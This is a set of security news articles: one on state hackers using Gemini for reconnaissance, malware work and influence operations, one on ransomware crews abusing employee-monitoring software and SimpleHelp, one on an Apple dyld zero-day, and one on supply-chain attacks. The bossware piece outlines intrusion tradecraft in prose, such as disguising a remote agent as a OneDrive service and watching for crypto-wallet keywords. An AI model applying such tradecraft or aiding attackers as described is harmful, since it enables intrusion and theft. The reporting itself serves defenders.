The research underscores how AI tools have matured in their cyber offensive capabilities, even as it doesn’t reveal novel or paradigm shifting uses of the technology.

John Hultquist, chief analyst at Google’s Threat Intelligence Group, told CyberScoop that many countries still appear to be experimenting with AI tools, determining where they best fit into the attack chain and provide more benefit than friction.

“Nobody’s got everything completely worked out,” Hultquist said. “They’re all trying to figure this out and that goes for attacks on AI, too.”

But the report also reveals that frontier AI models can build speed, scale and sophistication into a myriad of hacking tasks, and state-sponsored hacking groups are taking advantage.

Gemini was a useful, dynamic and convenient tool for many tasks, helping threat actors in a variety of different ways. In nearly all cases, Google’s reporting suggests that state-sponsored actors relied on Gemini as one tool among many, using it for specific purposes such as automating routine processes, conducting research or reconnaissance and experimenting with malware.

One North Korean group used it to synthesize open-source intelligence about job roles and salary information at cybersecurity and defense companies. Another North Korean group consulted it “multiple days a week” for technical support, using it to troubleshoot problems and generate new malware code when they got stuck during an operation. One Iranian APT used Gemini to “significantly augment reconnaissance” techniques against targeted victims. China, Russia, Iran and North Korea all also used Gemini to create fake articles, personas, and other assets for information operations.

“What’s so interesting about this capability is it’s going to have an effect across the entire intrusion cycle,” Hultquist said.

There are no instances of state groups using Gemini to automate large portions of a cyber attack, like a Chinese-government backed campaign identified by Anthropic last year. It suggests threat actors may still be struggling to implement fully or mostly-automated hacks using AI.

Hultquist said that some state groups, particularly those focused on espionage, may not find the speed and scale advantages of agentic AI useful if it results in louder, more detectable operations. In fact, while state actors continue to experiment with AI models, he believes on average these developments will help smaller cybercriminal outfits more than state-sponsored hackers.

But that could change in the future. Frontier AI companies like Anthropic and cybersecurity startups like XBOW have already developed models with powerful defensive cybersecurity capabilities in vulnerability scanning, reconnaissance and automation. Foreign governments with similar technology could use those same features for offensive hacking, as Chinese actors did with Claude before being discovered.

In December, the UK AI Security Institute’s inaugural report on frontier AI trends found that Al capabilities are improving rapidly across all tested domains, and particularly in cybersecurity.

And the gap between frontier and free, open-source models is shrinking. According to the institute, open-source AI models can now catch up and provide similar capabilities within 4-8 months of a frontier model release.

“The duration of cyber tasks that Al systems can complete without human direction is also rising steeply, from less than 10 minutes in early 2023 to over an hour by mid-2025,” the institute said in its Frontier AI Trends Report in December.

[28] The Register - Who's the bossware? Ransomware slingers like employee monitoring tools, too

Who's the bossware? Ransomware slingers like employee monitoring tools, too

As if snooping on your workers wasn't bad enough

Your supervisor may like using employee monitoring apps to keep tabs on you, but crims like the snooping software even more. Threat actors are now using legit bossware to blend into corporate networks and attempt ransomware deployment.

In late January and early February, the Huntress response team spotted two intrusions in which criminals chained Net Monitor for Employees Professional with remote monitoring and management (RMM) tool SimpleHelp, and then attempted to deploy ransomware on the victims' computers.

While the crims were ultimately unsuccessful, the security incidents highlight how miscreants love to use legitimate, commercial software for nefarious purposes because it makes it easier for them to hide inside enterprise IT environments.

"RMMs and employee monitoring tools blend in amongst legitimate signed binaries," Michael Tigges, senior security operations analyst at Huntress, told The Register, adding that "this is a rare case of the employee monitoring software being co-opted for subsequent access."

While neither of the victims' employers uses Net Monitor, repurposing this type of employee monitoring software falls into the "same category of RMM abuse," Tigges said. "Delineating which may be malicious and benign at first glance is exceedingly difficult. Adversaries know this as well."

The victims, we're told, were from different industry sectors, and "likely targets of opportunity rather than any specifically targeted group," he added.

This is a rare case of the employee monitoring software being co-opted for subsequent access

Tigges points out that "there are legitimate use cases for employee monitoring software - chiefly around data loss prevention."

This particular brand of bossware, however, does a whole lot more than passive screen monitoring. It can also establish remote shell connections and remotely execute commands on users' desktops. That makes it ideal for crims to use, even without modifying or infecting the installers.

"Threat actors leveraged this capability for hands-on-keyboard reconnaissance, additional tooling delivery, and deploying secondary remote access channels, effectively turning an employee monitoring tool into a fully functional RAT (remote access trojan)," Tigges and fellow threat hunters Anna Pham, Dray Agha, and Anton Ovrutsky wrote in a Wednesday blog.

As The Register previously reported, spying on workers is also bad for morale and doesn't inspire loyalty to the company, not to mention that employer-sanctioned RATs are creepy as all hell.

Here's what went down

In the first case that the Huntress team observed in late January, the attacker somehow installed Net Monitor for Employees on the victim's machine. Huntress doesn't know how the intruder gained initial access.

But once they had broken in, the criminals set to work manipulating user accounts via multiple net commands. This included attempting to identify valid usernames, reset passwords, and create new admin-user accounts on the host.

"As we kept pulling on investigative threads, we observed the 'Net Monitor for Employees' terminal pulling down a file via PowerShell named vhost.exe from the IP address of 160.191.182[.]41," the threat hunters wrote.

The executable turned out to be SimpleHelp, which the attacker then used in multiple attempts to tamper with Windows Defender. When this wasn't successful, the intruder tried to deploy multiple versions of Crazy ransomware linked to VoidCrypt.

In the second incident, which happened in early February, the attacker used a compromised third-party SSL VPN account to gain initial access to the victim's computer. Next, they connected to a domain controller using remote desktop protocol, launched a PowerShell session, and installed the Net Monitor agent, configuring the reverse connection to call back to an attacker-controlled console.

Net Monitor allows users to customize the service and process names, and the intruder took advantage of this to disguise the agent as Microsoft OneDrive, registering the service as OneDriveSvc, naming the process OneDriver.exe, and renaming the running binary to svchost.exe.

Then, the intruder installed SimpleHelp and configured it to monitor for keywords that would indicate cryptocurrency wallets, exchanges, blockchain explorers, and payment platforms. This, Huntress notes, indicates "the threat actor's financial motivation extends beyond ransomware to direct cryptocurrency theft."

The SimpleHelp agent also monitored for remote tool access keywords including RDP, AnyDesk, TeamViewer, and VNC.

Meanwhile, they used Net Monitor for Employees Professional to perform network reconnaissance on the compromised domain controller, probe internal network segments, and map out the network settings.

Huntress says shared infrastructure used in both cases, plus the reuse of the vhost.exe filename and overlapping IP addresses, "strongly suggest" a single attacker or group behind the two intrusions.

And to prevent becoming the next victim, turn on multi-factor authentication (MFA) on all remote access services and external-facing applications, and limit remote access to only those users and systems that require it to do their jobs.

The security analysts also suggest conducting regular audits of all third-party RMM tools and employee monitoring software, and monitoring for any unusual process execution chains. ®

[29] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

[30] The Register - Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Researchers say breaches link identity abuse, SaaS compromise, and ransomware into a cascading cycle

Cybercriminals are turning supply chain attacks into an industrial-scale operation, linking breaches, credential theft, and ransomware into a "self-reinforcing" ecosystem, researchers say.

In its latest trends report, Group-IB reckons individual strikes that lead to broader downstream compromises of businesses are now interconnected as cyberbaddies pursue multiple methods to breach vendors and service providers.

Supply chain hacks like the recent Shai-Hulud NPM worm, Salesloft debacle, or the OpenClaw package poisoning are fast becoming the primary goals of the criminal fraternity who try to exploit the inherited access to a victim's customers.

"Open source package compromise feeds malware distribution and credential theft," the research states. "Phishing and OAuth abuse enable identity compromise that unlocks SaaS and CI/CD environments. Data breaches supply the credentials, context, and relationships needed to refine impersonation and lateral movement. Ransomware and extortion arrive later in the chain, capitalizing on access and intelligence gathered earlier. Each stage strengthens the next, creating a self-reinforcing cycle of supply chain exploitation."

Over the next year, GroupIB predicts supply chain attacks will be executed faster thanks to AI-assisted tools that can scan for vulnerabilities across vendors, CI/CD pipelines, and browser extension marketplaces at machine speed.

It also expects to see traditional malware replaced by identity attacks, whereby criminals set themselves up as genuine users and their activity blends into the normal daily business functions, evading detection for longer periods.

Platforms offering HR, CRM, and ERP, as well as MSPs, are high-priority targets, Group-IB says, as a single compromise can lead to hackers gaining access to hundreds of customers.

Evolution of data breaches

The Salesloft breach, as well as the Oracle compromise of March 2025, are examples of how data breaches are shifting from a single-reward model to one where access is used for additional compromises.

Instead of taking one big wedge of data and demanding an extortion payment, criminals took their time to collect OAuth tokens and exploit misconfigured partner connections to move laterally. They then target downstream customers, steal their data and contact lists to repeat the cycle, or, in cases involving NPM and similar ecosystems, serve malicious updates to users to carry out fraud at scale.

"Cybercrime is no longer defined by single breaches. It is defined by cascading failures of trust," said Dmitry Volkov, Group-IB CEO.

"Attackers are industrializing supply chain compromise because it delivers scale, speed, and stealth. A single upstream breach can now ripple across entire industries. Defenders must stop thinking in terms of isolated systems and start securing trust itself, across every relationship, identity, and dependency."

Organizations should treat third parties as extensions of their own attack surface.

"Strategic investments in supply chain threat modeling, automated dependency checks, and data flow visibility are no longer optional – they are foundational to modern security architecture," said Volkov. ®
